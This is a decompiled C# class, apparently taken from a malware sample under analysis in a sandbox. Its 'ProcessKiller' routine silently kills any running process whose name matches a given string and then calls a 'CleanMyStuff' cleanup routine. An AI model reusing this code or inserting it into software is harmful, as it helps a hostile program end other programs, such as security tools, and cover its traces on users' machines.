// Decompiled with JetBrains decompiler
// Type: Complex.ProcessKiller
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d

using System;
using System.ComponentModel;
using System.Diagnostics;

namespace Complex
{
  public class ProcessKiller
  {
    public static bool ProcessCompareProductName(Process p, string match)
    {
      try
      {
        return p.ProcessName.ToLower().Contains(match.ToLower());
      }
      catch (Win32Exception ex)
      {
        return false;
      }
      catch (InvalidOperationException ex)
      {
        return false;
      }
      catch (NullReferenceException ex)
      {
        return false;
      }
      catch
      {
        return false;
      }
    }

    public static void ClosingCycle(string names, string dnames)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (ProcessKiller.ProcessCompareProductName(process, names.ToLower()))
        {
          try
          {
            process.Kill();
            process.WaitForExit();
            Program.CleanMyStuff();
          }
          catch (InvalidOperationException ex)
          {
          }
          catch (PlatformNotSupportedException ex)
          {
            break;
          }
          catch
          {
          }
        }
      }
    }
  }
}
